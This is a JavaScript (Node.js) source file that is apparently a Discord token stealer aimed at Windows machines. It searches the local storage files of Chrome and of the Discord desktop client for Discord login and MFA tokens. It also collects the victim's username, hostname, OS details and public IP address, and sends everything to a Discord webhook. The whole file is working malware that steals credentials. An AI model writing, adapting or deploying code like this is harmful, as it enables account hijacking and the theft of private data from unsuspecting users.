//Dependencies
const Discord = require("discord.js")
const Public_IP = require("public-ip")
const Os = require("os")
const Fs = require("fs")

//Variables
const Webhook = new Discord.WebhookClient("WebhookID", "WebhookToken")

var Self_Data = {}
Self_Data.cdt = null
Self_Data.sdt = null

//Main
Main()
function Main(){
    CDT()
    function CDT(){
        Fs.readdir(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb`, "utf8", function(err, files){
            if(err){
                SDT()
                return
            }

            files.forEach(file =>{
                if(file.indexOf("log") != -1){
                    const log_data = Fs.readFileSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\${file}`, "utf8")
                    const tokens = Array.from(log_data.matchAll(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g))
                    var result_tokens = ""
                    
                    if(tokens.length == 0){
                        Self_Data.cdt = "No discord tokens in chrome."
                        SDT()
                        return
                    }

                    for( i = 0; i <= tokens.length-1; i++ ){
                        if(result_tokens.indexOf(tokens[i][0]) == -1){
                            if(result_tokens.length == 0){
                                result_tokens = tokens[i][0]
                            }else{
                                result_tokens += `, ${tokens[i][0]}`
                            }
                        }
                    }

                    Self_Data.cdt = result_tokens
                    SDT()
                    return
                }
            })
        })
    }

    function SDT(){
        Fs.readdir(`C:\\Users\\${Os.userInfo().username}\\AppData\\Roaming\\discord\\Local Storage\\leveldb`, "utf8", function(err, files){
            if(err){
                Done()
                return
            }

            files.forEach(file =>{
                if(file.indexOf("log") != -1){
                    const log_data = Fs.readFileSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\${file}`, "utf8")
                    const tokens = Array.from(log_data.matchAll(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g))
                    var result_tokens = ""
                    
                    if(tokens.length == 0){
                        Self_Data.sdt = "No discord tokens in discord software."
                        SDT()
                        return
                    }

                    for( i = 0; i <= tokens.length-1; i++ ){
                        tokens[i][0] = tokens[i][0].replace('"token":"', "")
                        tokens[i][0] = tokens[i][0].replace('"', "")

                        if(result_tokens.indexOf(tokens[i][0]) == -1){
                            if(result_tokens.length == 0){
                                result_tokens = tokens[i][0]
                            }else{
                                result_tokens += `, ${tokens[i][0]}`
                            }
                        }
                    }

                    Self_Data.sdt = result_tokens
                    Done()
                    return
                }
            })
        })
    }

    async function Done(){
        const IP = await Public_IP.v4()

        Webhook.send("```" + `OS Type: ${Os.type()}
OS Platform: ${Os.platform()}
OS Hostname: ${Os.hostname()}
                
OS Username: ${Os.userInfo().username}
IP: ${IP}

Chrome discord tokens found: ${Self_Data.cdt}
Software discord tokens found: ${Self_Data.sdt}` + "```",).then(()=>{
            process.exit()
        }).catch(()=>{
            process.exit()
        })
    }
}
